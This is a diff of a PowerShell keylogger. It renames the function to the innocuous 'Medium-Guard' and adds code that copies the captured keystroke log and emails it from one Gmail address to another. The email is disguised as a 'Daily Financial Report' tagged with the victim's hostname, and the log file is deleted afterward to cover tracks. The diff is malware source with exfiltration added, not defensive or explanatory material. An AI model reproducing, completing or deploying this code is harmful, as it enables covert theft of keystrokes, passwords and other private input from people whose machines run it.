@@ -1,4 +1,4 @@
-function Take-Trash {
+function Medium-Guard {
 #This is not the script you're looking for.
     [CmdletBinding()] 
     Param (
@@ -298,6 +298,7 @@ function Take-Trash {
 
                 #return results
                 Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
+		Copy-item "$env:TEMP/key.log" -Destination "$env:TEMP/key_final.txt"
             }
             return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
         }
@@ -325,6 +326,16 @@ function Take-Trash {
     
         # Remove the hook
         $UnhookWindowsHookEx.Invoke($Hook)
+	
+	#Send email with report
+        $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com'; 
+        $ReportEmail.To.Add('warof1846@gmail.com'); 
+        $ReportEmail.Subject = 'Daily Financial Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName; 
+        $ReportEmail.Body = 'Automated report.';
+        $ReportEmail.Attachments.Add('%temp%/key_final.txt');
+        $SMTPInfo.Send($ReportEmail);
+        $SMTPInfo.Send($ReportEmail);
+        Remove-item "$env:TEMP/key_final.txt"
     }
 
     # Setup fun runspace
